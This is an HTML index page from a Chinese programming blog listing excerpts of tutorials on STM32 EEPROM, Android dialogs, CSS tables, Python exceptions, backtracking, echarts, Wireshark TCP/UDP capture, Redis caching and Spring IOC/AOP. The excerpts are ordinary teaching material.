<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/63897e81ad066bd29ace3d0e3f66180a/" rel="bookmark">
			学习笔记四.基于HAL库的stm32f103硬件读写EEPROM（CUBEMX）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基于cubemx的stm32f103硬件读写EEPROM 今天介绍一种可擦除存储器.
EEPROM (Electrically Erasable Programmable read only memory)是指带电可擦可编程只读存储器。是一种掉电后数据不丢失的存储芯片。EEPROM 可以在电脑上或专用设备上擦除已有信息，重新编程。一般用在即插即用。（百度百科）
一般常规单片机的EEPROM是AT24C02
（AT24C02是一个2K位串行CMOS E2PROM， 内部含有256个8位字节，CATALYST公司的先进CMOS技术实质上减少了器件的功耗。AT24C02有一个16字节页写缓冲器。该器件通过IIC总线接口进行操作，有一个专门的写保护功能。【百度百科】）
EEPROM 芯片最常用的通讯方式就是 I2C 协议，在上一篇文章我们介绍了用软件IIC写OLED，今天我们采用硬件IIC（因为软件IIC调试出了问题，还没解决，解决了补上传）。
打开cubemx配置硬件IIC，顺便配置一下串口方便监测数据。
读写eeprom主要用这句函数
HAL_StatusTypeDef HAL_I2C_Mem_Write(I2C_HandleTypeDef *hi2c, uint16_t DevAddress, uint16_t MemAddress, uint16_t MemAddSize, uint8_t *pData, uint16_t Size, uint32_t Timeout)
参数解释
对这句函数做一下小的封装，就可以写入字节，和页写入。写之前要注意eeprom的写地址是0XA0,读地址0XA1。
//只写 uint8_t At24c02_Write_Byte(uint16_t addr, uint8_t* data) { return HAL_I2C_Mem_Write(&amp;hi2c1, AT24C02_ADDR_WRITE, addr, I2C_MEMADD_SIZE_8BIT, data, 1, 0xFFFF); } //只读 uint8_t At24c02_Read_Byte(uint16_t addr, uint8_t* data,uint16_t size) { return HAL_I2C_Mem_Read(&amp;hi2c1, AT24C02_ADDR_READ, addr, I2C_MEMADD_SIZE_8BIT, data, size, 0xFFFF); } //参数为写地址，写的数据（一般可以定义一个数组），读地址 void eeprom_onebit_rw(uint16_t write_addr, uint8_t* write_dat,uint16_t read_addr)	{ uint8_t recv_buf=0;//读取数据的数组 if(HAL_OK == HAL_I2C_Mem_Write(&amp;hi2c1, AT24C02_ADDR_WRITE, write_addr, I2C_MEMADD_SIZE_8BIT, write_dat, 1, 0xFFFF)) { printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/63897e81ad066bd29ace3d0e3f66180a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/855cf395e8960046c0953b1b4db75a6e/" rel="bookmark">
			Android-继承Dialog&#43;自定义布局（QQ弹出框）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.对话框布局
&lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android" android:layout_width="match_parent" android:layout_height="match_parent" android:background="@drawable/mdialog_bg" &gt; &lt;RelativeLayout android:id="@+id/layout_title" android:layout_width="280dp" android:layout_height="100dp" android:gravity="center" &gt; &lt;TextView android:id="@+id/title" android:layout_width="wrap_content" android:layout_height="wrap_content" android:gravity="center" android:text="@string/text_context" android:textColor="@color/black" &gt;&lt;/TextView&gt; &lt;/RelativeLayout&gt; &lt;View android:layout_width="280dp" android:layout_height="1dp" android:background="@color/huise" android:layout_marginBottom="1dp" android:layout_below="@+id/layout_title" &gt;&lt;/View&gt; &lt;!-- 对话框按钮区域 --&gt; &lt;RelativeLayout android:layout_width="280dp" android:layout_height="wrap_content" android:id="@+id/bottom" android:layout_below="@+id/layout_title" &gt; &lt;LinearLayout android:layout_width="280dp" android:layout_height="wrap_content" android:orientation="horizontal"&gt; &lt;Button android:id="@+id/b1" android:layout_width="0dp" android:layout_height="wrap_content" android:layout_marginTop="18dp" android:layout_weight="1" android:background="@null" android:paddingBottom="10dp" android:text="@string/text_cancel" android:textColor="@color/blue_btn" android:textSize="18sp"&gt;&lt;/Button&gt; &lt;View android:layout_width="1dp" android:layout_height="match_parent" android:background="@color/huise"&gt;&lt;/View&gt; &lt;Button android:id="@+id/b2" android:layout_width="0dp" android:layout_height="wrap_content" android:layout_marginTop="18dp" android:layout_weight="1" android:background="@null" android:paddingBottom="10dp" android:text="@string/text_exit" android:textColor="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/855cf395e8960046c0953b1b4db75a6e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/81255e413a0619c7373afd767875a5b0/" rel="bookmark">
			css3 表格分两栏竖向排列,效果非常干净清爽(纵向显示)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一般表格显示效果为
竖向效果
css代码,如果需要只在手机上显示这种效果,可能用到媒体查询
@media only screen and (max-width:760px){这里是css代码} 如果不需要,可以直接这样
测试时,请去掉其它样式的影响,单独 进行测试.否则可能会被干扰
.table-responsive-y table,.table-responsive-y thead,.table-responsive-y tbody,.table-responsive-y th,.table-responsive-y td,.table-responsive-y tr{display:block} .table-responsive-y thead tr{position:absolute;top:-9999px;left:-9999px} .table-responsive-y tr{border:1px solid #ccc} .table-responsive-y td{border:0;border-bottom:1px solid #eee;position:relative;padding:5px;padding-left:20%;white-space:normal;text-align:left;height:auto!important;line-height:auto!important;;} .table-responsive-y td:before{position:absolute;top:6px;left:6px;width:40%;/*这里可能没用*/padding-right:10px;white-space:nowrap;text-align:left;font-weight:bold;height:auto!important;line-height:auto!important;} .table-responsive-y td:before{content:attr(data-title)} .table-responsive-y h3 a{font-size:16px;color:#3cbfae;font-weight:bold} &lt;div class="table-responsive-y"&gt; &lt;table class=""&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt; 起步 &lt;/th&gt; &lt;th&gt; CSS &lt;/th&gt; &lt;th&gt; 元件 &lt;/th&gt; &lt;th&gt; 模块 &lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;tr&gt; &lt;td data-title="起步"&gt; 下载前端框架 &lt;/td&gt; &lt;td data-title="CSS"&gt; 文本 &lt;/td&gt; &lt;td data-title="元件"&gt; 网格系统 &lt;/td&gt; &lt;td data-title="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/81255e413a0619c7373afd767875a5b0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/15493d13c54ad29a151822eab38da837/" rel="bookmark">
			Python异常处理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		什么是异常？ 异常就是一个事件，该事件会在程序执行过程中发生，影响了程序的正常执行。一般，在 Python 无法正常处理程序时会发生异常。
异常是Python对象，表示一个错误。当Python脚本发生异常时，我们需要处理它，否则程序会停止终止。
标准异常 异常名称	描述 基本异常	所有异常的基类 系统退出	解释器请求退出 键盘中断	用户中断执行(通常是输入^C) 例外	经常错误的基类 停止迭代	迭代器没有更多的值 生成器异常	生成器(generator)发生异常来通知退出 标准错误	所有的内建标准异常的基类 算术错误	所有计算错误的基类 浮点错误	浮点计算错误 溢出错误	最大极限限制 零分误差	除(或取模)零(所有数据类型) 断言错误	断言语句失败 属性错误	对象没有这个属性 EOF错误	没有内建输入,到达EOF标记 环境错误	操作系统错误的基类 IO错误	输入/输出操作失败 操作系统错误	系统错误 视窗错误	系统调用失败 导入错误	导入模块/对象失败 查找错误	无效数据查询的基类 索引错误	序列中没有此索引(index) 密钥错误	映射中没有这个键 内存错误	内存错误错误（对于 Python 解释器不是目标的） 名称错误	未声明/初始化对象(没有属性) 未绑定本地错误	访问未初始化的本地变量 参考错误	弱引用（弱引用）获取访问已经回收了的对象 运行时错误	一般的运行时错误 未实现错误	尚未实现的方法 语法错误	Python 语法错误 缩进错误	缩进错误 标签错误	Tab 和空格混用 系统错误	一般的解释器系统错误 类型错误	对类型无效的操作 值错误	间接的参数 错误码	Unicode 相关的错误 Unicode解码错误	Unicode解码时的错误 Unicode编码错误	Unicode编码时错误 Unicode 翻译错误	Unicode 转换时错误 警告	警告的基类 弃用警告	关于被弃用的特征的警告 未来警告	关于准备将来会出现的警告 溢出警告	旧的关于自动提升为长整型（长）的警告 未决弃用警告	关于特性将被废弃的警告 运行时警告	择的运行时行为(runtime behavior)的警告 语法警告	参考的语法的警告 用户警告	用户代码生成的警告 异常处理 捕捉异常可以使用try/except语句。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/15493d13c54ad29a151822eab38da837/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c39de028fb16916e86a4088a14d67fe9/" rel="bookmark">
			回溯算法总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		常用回溯算法题目是排列问题、组合问题、皇后问题 首先给出多叉树遍历框架和回溯算法的核心框架，回溯算法的知识点总结如下：
1、回溯算法本身是一种暴力穷举算法
2、穷举的过程就是遍历一个多叉树的过程
3、回溯算法的代码框架和多叉树遍历的代码框架相似
排列问题 (1)题目链接：Leetcode46 全排列问题
本题可以通过交换数组元素的位置来做，这个部分在蓝桥杯总结过程中已经用过了。另一种是通过遍历树来来解决，本题的一个遍历树是这样的
ref[1]:图源
代码是这样的
std::vector&lt;std::vector&lt;int&gt; &gt; ans; void backtracing(std::vector&lt;int&gt;&amp; nums, std::vector&lt;int&gt; &amp;path){ if(path.size()==nums.size()){ans.push_back(path);} for(int i = 0; i &lt; nums.size(); i++){ if(std::find(path.begin(), path.end(), nums[i])!=path.end()){continue;} path.push_back(nums[i]); backtracing(nums, path); path.pop_back(); } } vector&lt;vector&lt;int&gt;&gt; permute(vector&lt;int&gt;&amp; nums) { std::vector&lt;int&gt; path; backtracing(nums, path); return ans; } 时间复杂度分析：回溯算法由于其遍历的特点，复杂福一般都比较高，有些问题分析起来也很复杂。一些回溯算法解决的问题，剪枝剪得好的话，复杂度会降低一点，因此分析最坏时间复杂度的意义也不是很大。但是还是是情况而定。
递归函数的复杂度=递归函数本身的复杂度*递归函数被调用的次数。所以这里的回溯算法的时间复杂度为O(N*N*N!)(find函数查找也需要O(N)的复杂度)，空间复杂度也是O(N*N!)
2、变种
给定一个可包含重复数字的序列 nums ，按任意顺序 返回所有不重复的全排列。
这种情况就需要剪枝了，具体而言需要对递归树进行剪枝
这个剪枝的过程的判断是这样的
if(visited[i]){continue;} if(i&gt;0&amp;&amp;nums[i]==nums[i-1]&amp;&amp;visited[i-1]==false){continue;} 代码是这样的
std::vector&lt;std::vector&lt;int&gt;&gt; ans; vector&lt;vector&lt;int&gt;&gt; permuteUnique(vector&lt;int&gt;&amp; nums) { sort(nums.begin(), nums.end()); std::vector&lt;bool&gt; visited(nums.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c39de028fb16916e86a4088a14d67fe9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d4b3c1a31db2977329e6853cb8eefd50/" rel="bookmark">
			echarts饼图铺满整个div
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天在做公司项目的时候，用了echarts的一个饼图，设置了当前这个饼图形成的div的大小，init一个饼图的时候，总感觉这个饼图没有办法铺满整个div，主要是上下留白的空隙太大，影响布局，如图所示：
期望：饼图能够尽可能的铺满，上下的空隙小一点
查了点资料很多都说设置grid这个属性的，但是grid这个属性主要是对柱状图起作用。
最终发现其实就是series里面的radius属性来控制这个大小的
radius属性第一个百分数设置内圈大小
radius属性第一个百分数设置外圈的大小，也就是设置到100% 形成的饼图上下正好顶到div的最上面和最下面 铺满整个div
我的饼图的整个代码如下：
let myChart = this.$echarts.init(document.getElementById('equipmentStatus')); let option = { tooltip: {}, graphic: [ { type: 'text', //通过不同top值可以设置上下显示 left: '42%', top: '45%', style: { text: '123台', textAlign: 'center', fill: '#000', //文字的颜色 fontSize: 24, } } ], color: ['#61a5e8', '#7ecf51', '#eecb5f', '#e3935d','#e16757'], series: [ { name: '设备状态', type: 'pie', radius: ['70%', '100%'], center: ['50%', '50%'], avoidLabelOverlap: false, normal: { borderWidth: 2, borderColor: '#fff', }, label: { show: false, position: 'center', normal: { show: true, position: 'center', formatter: `{a}\n${50}` }, emphasis: { show: true, } }, data: [ { value: 99, name: '健康设备',label: { show: false } }, { value: 20, name: '亚健康设备' ,label: { show: false }}, { value: 3, name: '有隐患设备' ,label: { show: false }}, { value: 1, name: '未检测设备',label: { show: false } } ] } ] }; // 使用刚指定的配置项和数据显示图表。 myChart.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d4b3c1a31db2977329e6853cb8eefd50/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bc259008cfd8d9eff8939bff44bde68e/" rel="bookmark">
			【计算机网络】利用WireShark分析TCP/UDP协议
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前期准备： IntelliJ IDEA 2021.1.3 (Ultimate Edition) Build #IU-211.7628.21, built on June 30, 2021JDK 1.8或以上版本WireShark网络协议解析器 Version 2.4.13 (v2.4.13-0-gf2c6a94a3f)查询本地回环的工具RawCap 分析过程： 1、对TCP协议进行分析 （1）利用java编写TCP服务端和客户端（略） （2）打开抓包软件 Wireshark虽然可以抓任何协议的包，但当你测试一个本机的socket程序，发送/接收到本地端口的时候，却无法抓取本地回环数据。这个时候需要借助一个工具RawCap进行本地环路的抓包
注意，抓包软件和RawCap.exe要放在一个目录下
打开cmd，进入到抓包工具所在目录，输入
RawCap.exe 本地IP TCPfile.pcap 即可运行RawCap抓包程序，此时不要按Ctrl+C或终止程序，之后进行后续操作
（3）进行调试，打开客户端和服务端，客户端发送消息，服务端就会接收到消息 服务端：接收到客户端发来的消息并响应
客户端：发送消息后收到响应
（4）上述步骤完成后，切换到cmd界面，此时我们看到packets的数量发生变化，此时我们按Ctrl+C终止程序（不要点右上角×号），在工具目录下就会生成一个TCPdump.pcap文件，我们用WireShark打开这个文件 打开之后如图所示
这就是所有在127.0.0.1的通讯数据
（5）但这里我们要找TCP协议的通讯，所以使用过滤器 tcp.stream eq 8，之后显示TCP通讯的数据，或者随便找一个TCP流，右键“追踪流”–“追踪TCP流”，一个流一个流的查找即可，这里显示过滤后和追踪的结果 过滤后结果
追踪后结果
注：若数据流有中文，则将“显示和保存数据为”那一栏改为utf-8，不然无法显示中文数据，在这里我们看到客户端发送的消息是蓝色背景，服务端发送的消息是红色背景，点击可查看对应信息的数据流情况。
（6）对数据流进行分析 看前三条数据流，代表着TCP的三次握手
TCP三次握手：
（1）第一次握手：建立连接时，客户端A发送SYN包（SYN=j）到服务器B，并进入SYN_SEND状态，等待服务器B确认。
（2）第二次握手：服务器B收到SYN包，必须确认客户A的SYN（ACK=j+1），同时自己也发送一个SYN包（SYN=k），即SYN+ACK包，此时服务器B进入SYN_RECV状态。
（3）第三次握手：客户端A收到服务器B的SYN＋ACK包，向服务器B发送确认包ACK（ACK=k+1），此包发送完毕，客户端A和服务器B进入ESTABLISHED状态，完成三次握手。
直接双击一条服务器端的数据流进行分析
分析情况见下图
可以看到使用ipv4协议，版本号为4
TTL为128，通讯协议为TCP
IP头长度为20
源地址和目的地址ip:127.0.0.1
信息总长度40，源端口5000（服务端），目的地端口49848（客户端）
再点击一条客户端的数据流进行分析
可以看到使用ipv4协议，版本号为4
TTL为128，通讯协议为TCP
IP头长度为20
源地址和目的地址ip:127.0.0.1
信息总长度70，源端口49898（客户端），目的地端口5000（服务端）
2、对UDP协议进行分析 （1）（2）步与上面差不多大致相同，输出的文件改成UDPdump.pcap即可 （3）进行调试，打开客户端和服务端，客户端发送消息，服务端就会接收到消息 客户端：发送消息后收到响应，统计发送的次数
服务端：接收到客户端发来的消息，并显示发送的数据
（4）上述步骤完成后，同样切换到cmd界面，此时我们看到packets的数量发生变化，此时我们按Ctrl+C终止程序（不要点右上角×号），在工具目录下就会生成一个UDPdump.pcap文件，我们用WireShark打开 （5）但这里我们要找UDP协议的通讯，所以使用过滤器 udp.stream eq 0，之后显示UDP通讯的数据，或者随便找一个TCP流，右键“追踪流”–“追踪TCP流”，一个流一个流的查找即可，这里显示过滤后和追踪的结果 过滤后结果
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bc259008cfd8d9eff8939bff44bde68e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c878f1b267c4b927046c95f99fd8dc8d/" rel="bookmark">
			数组去重和数组扁平化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		数组去重我们不但会在平时的开发中用到，就是面试也是高频出现的一道题,面试官的目的主要是想了解我们对基础知识的掌握以及是否能用更优雅的方法去实现。
数组去重 以下几种方法均采用
const arr = [1, 1, 2, 3, 3, 4, 5, 5, 6, 7, 7, 8, 9, 9, 10]
双循环去重 主要思想就是定义一个新数组，存放原数组的第一个元素，然后将原数组–和新数组的元素对比，若不同则存放在新数组里 function unique(arr) { let arr1 = [arr[0]] for(let i = 0; i &lt; arr.length; i++ ) { let flag = true for(let j = 0; j &lt; arr1.length; j++) { if (arr[i] === arr1[j]) { flag = false; break } } if (flag) { arr1.push(arr[i]) } } return arr1 } indexOf去重1 主要思想：创建一个新数组并判断元素是否已经在新数组出现过，没有则添加到新数组 function unique(arr) { let arr1 = [] for (let i = 0; i &lt; arr.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c878f1b267c4b927046c95f99fd8dc8d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/10c33cf120ea20bd8e58b4bf5dbe4fee/" rel="bookmark">
			【Redis热点数据缓存】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我是🌟廖志伟🌟，一名🌕Java开发工程师🌕、📝Java领域优质创作者📝、🎉CSDN博客专家🎉、🌹幕后大佬社区创始人🌹。拥有多年一线研发经验，研究过各种常见框架及中间件的底层源码，对于大型分布式、微服务、三高架构（高性能、高并发、高可用）有过实践架构经验。
🍊博主：java_wxid
🍊博主：Java廖志伟
🍊社区：幕后大佬
文章目录 互斥锁（mutex）永远不过期 本文内容： 热点数据缓存
当前key是一个热点key（例如一个热门的娱乐新闻），并发量非常大重建缓存不能在短时间完成，可能是一个复杂计算，例如复杂的SQL、多次IO、多个依赖等在缓存失效的瞬间，有大量线程来重建缓存，造成后端负载加大，甚至可能会让应用崩溃。
互斥锁（mutex） 解决方案一：互斥锁（mutex）
只允许一个线程重建缓存，其他线程等待重建缓存的线程执行完，重新从缓存获取数据。
1）从Redis获取数据，如果值不为空，则直接返回值；否则执行下面的2.1）和2.2）步骤 2.1）如果set（nx和ex）结果为true，说明此时没有其他线程重建缓存， 那么当前线程执行缓存构建逻辑 2.2）如果set（nx和ex）结果为false，说明此时已经有其他线程正在执 行构建缓存的工作，那么当前线程将休息指定时间（例如这里是50毫秒，取决于构建缓存的速度）后，重新执行函数，直到获取到数据。 优缺点：如果构建缓存过程出现问题或者时间较长，可能会存在死锁和线程池阻塞的风险，但是这种方法能够较好地降低后端存储负载，并在一致性上做得比较好。
永远不过期 解决方案二：永远不过期
从缓存层面来看，确实没有设置过期时间，所以不会出现热点key过期 后产生的问题，也就是“物理”不过期。 从功能层面来看，为每个value设置一个逻辑过期时间，当发现超过逻 辑过期时间后，会使用单独的线程去构建缓存。 优缺点：由于没有设置真正的过期时间，实际上已经不存在热点key产生的一系列危害，但是会存在数据不一致的情况，同时代码复杂度会增大。
问题：怎么知道哪些数据是热点数据？因为本地缓存资源有限，不可能把所有的商品数据进行缓存，它只会缓存热点的数据。那怎么知道数据是热点数据呢？
利用redis4.x自身特性，LFU机制发现热点数据。实现很简单，只要把redis内存淘汰机制设置为allkeys-lfu或者volatile-lfu方式，再执行./redis-cli --hotkeys会返回访问频率高的key，并从高到底的排序,在设置key时，需要把商品id带上，这样就是知道是哪些商品了。
总结
以上就是今天要讲的内容，还希望各位读者大大能够在评论区积极参与讨论，给文章提出一些宝贵的意见或者建议📝，合理的内容，我会采纳更新博文，重新分享给大家。
🙏四连 关注🔎点赞👍收藏⭐️留言📝
感谢大家的支持，用心写博文分享给大家，你的支持（🔎点赞👍收藏⭐️留言📝）是对我创作的最大帮助。
🍊微信公众号：南北踏尘
🍊主页地址：java_wxid
🍊社区地址：幕后大佬
给读者大大的话
我本身是一个很普通的程序员，放在人堆里，除了与生俱来的🌹盛世美颜🌹、所剩不多的发量，就剩下180的大高个了。就是我这样的一个人，默默坚持写博文也有好多年了，有句老话说的好，🌕牛逼之前都是傻逼式的坚持🌕。希望自己可以通过大量的作品，时间的积累，个人魅力、运气和时机，可以打造属于自己的🌟技术影响力🌟。同时也希望自己可以成为一个🎄懂技术🎄，🎄懂业务🎄，🎄懂管理🎄的综合型人才，作为项目架构路线的总设计师，掌控全局的🌕团队大脑🌕，技术团队中的🍊绝对核心🍊是我未来几年不断前进的目标。
提示：以下都是资源分享，求个一键三连。 面试资料
福利大放送，🎉欢迎关注🔎点赞👍收藏⭐️留言📝，拜托了🙏，这对我真的很重要。
点击：面试资料
提取码：2021
200套PPT模板
福利大放送，🎉欢迎关注🔎点赞👍收藏⭐️留言📝，拜托了🙏，这对我真的很重要。
点击：200套PPT模板
提取码：2021
提问的智慧
福利大放送，🎉欢迎关注🔎点赞👍收藏⭐️留言📝，拜托了🙏，这对我真的很重要。
点击：提问的智慧
提取码：2021
Java开发学习路线
名称链接JavaSE点击： JavaSE MySQL专栏点击： MySQL专栏JDBC专栏点击： JDBC专栏MyBatis专栏点击： MyBatis专栏Web专栏点击： Web专栏Spring专栏点击： Spring专栏SpringMVC专栏点击： SpringMVC专栏SpringBoot专栏点击： SpringBoot专栏SpringCould专栏点击： SpringCould专栏Redis专栏点击： Redis专栏Linux专栏点击： Linux专栏Maven3专栏点击： Maven3专栏 Spring Security5专栏点击： Spring Security5专栏更多专栏更多专栏，请到 java_wxid主页 查看 P5学习路线图
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/10c33cf120ea20bd8e58b4bf5dbe4fee/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0b9f37f8b0fd09b3e7bf74bde9f1710d/" rel="bookmark">
			关于SpringMvc中的IOC和AOP的理解笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 理解Spring的AOP和IOC实现原理1、 IOC02、SpringIoc的设计初衷是什么？03、SpringIOC的核心概念04、springioc容器的bean是单列的吗？05、所谓的依赖注入06：总结Springbean的三级缓存（循环依赖的问题）？ 2、AOP01、为什么要学习AOP02、如何进行的拦截的呢？03、AOP是如何增强的呢？04、总结05、谈谈你对Sprign的AOP的认识？ 理解Spring的AOP和IOC实现原理 1、 IOC IOC（控制反转）就是依赖倒置原则的一种代码设计思路。就是把原先在代码里面需要实现的对象创建、对象之间的依赖，反转给容器来帮忙实现。
Spring IOC容器通过xml,注解等其它方式配置类及类之间的依赖关系，完成了对象的创建和依赖的管理注入。实现IOC的主要设计模式是工厂模式。
这句话的意思是：
1、IOC控制反转的含义，它是把java面向对象的创建对象的过程，交由容器来进行管理一种机制。
2、它实现的方式，是通过XML，获取注解，配置类的方式实现类和类之间的依赖关系。
3、来完成的对象的创建和依赖管理的注入。
02、SpringIoc的设计初衷是什么？ 集中管理，实现类的可配置和易管理。降低了类与类之间的耦合度。实现java高内聚低耦合的设计思想同时可以提升java应用程序的性能，减轻JVM的内存压力。 03、SpringIOC的核心概念 其实本质是通过：java语言衍生出来的框架和项目产品，只不过开源出来。你使用spring最大感受是什么？
是不是再也没有去new对象呢或者说你很少在去是实例化对象了
核心：创建对象，管理对象，注入对象，控制对象等，一句话：SpringIoc管理对象的整个生命周期。
非常经典的面试题：Spring的bean的生命周期
04、springioc容器的bean是单列的吗？ 这个所谓单列不是指：用所谓的单列设计模式开发和你们所认识的单列不一样。
在你们眼中的单列模式：恶汉模式，懒汉模式，双重检查机制等等。
它们的共同点是：在内存空间中只有一份内存。思想是一样的。
那么sprignioc的bean的单列指是什么？
答案：就是一个容器Map，因为这个Map是一个全局的变量。
public class Factory{ private final Map&lt;String, BeanDefinition&gt; beanDefinitionMap; beanDefinitionMap.put("userServiceImpl",new BeanDefinition()); beanDefinitionMap.put("userServiceImpl2",new BeanDefinition()); } 05、所谓的依赖注入 DI—Dependency Injection，即“依赖注入”：是组件之间依赖关系由容器在运行期决定，形象的说，即由容器动态的将某个依赖关系注入到组件之中。依赖注入的目的并非为软件系统带来更多功能，而是为了提升组件重用的频率，并为系统搭建一个灵活、可扩展的平台。通过依赖注入机制，我们只需要通过简单的配置，而无需任何代码就可指定目标需要的资源，完成自身的业务逻辑，而不需要关心具体的资源来自何处，由谁实现。
理解DI的关键是：“谁依赖谁，为什么需要依赖，谁注入谁，注入了什么”，那我们来深入分析一下：
●谁依赖于谁：当然是应用程序依赖于IoC容器；
●为什么需要依赖：应用程序需要IoC容器来提供对象需要的外部资源；
●谁注入谁：很明显是IoC容器注入应用程序某个对象，应用程序依赖的对象；
●注入了什么：就是注入某个对象所需要的外部资源（包括对象、资源、常量数据）。
IoC和DI由什么关系呢？其实它们是同一个概念的不同角度描述，由于控制反转概念比较含糊（可能只是理解为容器控制对象这一个层面，很难让人想到谁来维护对象关系），所以2004年大师级人物Martin Fowler又给出了一个新的名字：“依赖注入”，相对IoC 而言，“依赖注入”明确描述了“被注入对象依赖IoC容器配置依赖对象”。
所谓的依赖注入：其实就告诉你，在实际开发和生产中，类和类直接很多时候会存在所谓的依赖关系。为了这种一个对象依赖另外一个对象的时候，把存在依赖的对象实例化的过程称之为：依赖注入。
DI：它其实就把容器中创建存放好的对象，通过DI机制去完成类执行对象的实例化的问题。说白了就是：具体ioc动作。
1、IoC(控制反转)
==首先想说说IoC（Inversion of Control，控制反转）。这是spring的核心，贯穿始终。所谓IoC，对于spring框架来说，就是由spring来负责控制对象的生命周期和对象间的关系。==这是什么意思呢，举个简单的例子，我们是如何找女朋友的？常见的情况是，我们到处去看看找到自己喜欢的，然后打听她们的兴趣爱好、qq号、电话号………，想办法认识她们，投其所好送其所要……这个过程是复杂深奥的，我们必须自己设计和面对每个环节。传统的程序开发也是如此，在一个对象中，如果要使用另外的对象，就必须得到它（自己new一个），使用完之后还要将对象销毁，对象始终会和其他的接口或类耦合起来。
那么IoC是如何做的呢？有点像通过婚介找女朋友，在我和女朋友之间引入了一个第三者：婚姻介绍所。婚介管理了很多男男女女的资料，我可以向婚介提出一个要求的列表，告诉它我想找个什么样的女朋友，然后婚介就会按照我们的要求，提供一个女孩，我们只需要去和她谈恋爱、结婚就行了。简单明了，如果婚介给我们的人选不符合要求，我们就会抛出异常。整个过程不再由我自己控制，而是有婚介这样一个类似容器的机构来控制。Spring所倡导的开发方式就是如此，所有的类都会在spring容器中登记，告诉spring你是个什么东西，你需要什么东西，然后spring会在系统运行到适当的时候，把你要的东西主动给你，同时也把你交给其他需要你的东西。所有的类的创建、销毁都由 spring来控制，也就是说控制对象生存周期的不再是引用它的对象，而是spring。对于某个具体的对象而言，以前是它控制其他对象，现在是所有对象都被spring控制，所以这叫控制反转。
2、DI(依赖注入)
==IoC的一个重点是在系统运行中，动态的向某个对象提供它所需要的其他对象。这一点是通过DI（Dependency Injection，依赖注入）来实现的。比如对象A需要操作数据库，以前我们总是要在A中自己编写代码来获得一个Connection对象，有了 spring我们就只需要告诉spring，==A中需要一个Connection，至于这个Connection怎么构造，何时构造，A不需要知道。在系统运行时，spring会在适当的时候制造一个Connection，然后像打针一样，注射到A当中，这样就完成了对各个对象之间关系的控制。A需要依赖 Connection才能正常运行，而这个Connection是由spring注入到A中的，依赖注入的名字就这么来的。那么DI是如何实现的呢？ Java 1.3之后一个重要特征是反射（reflection），它允许程序在运行的时候动态的生成对象、执行对象的方法、改变对象的属性，spring就是通过反射来实现注入的。
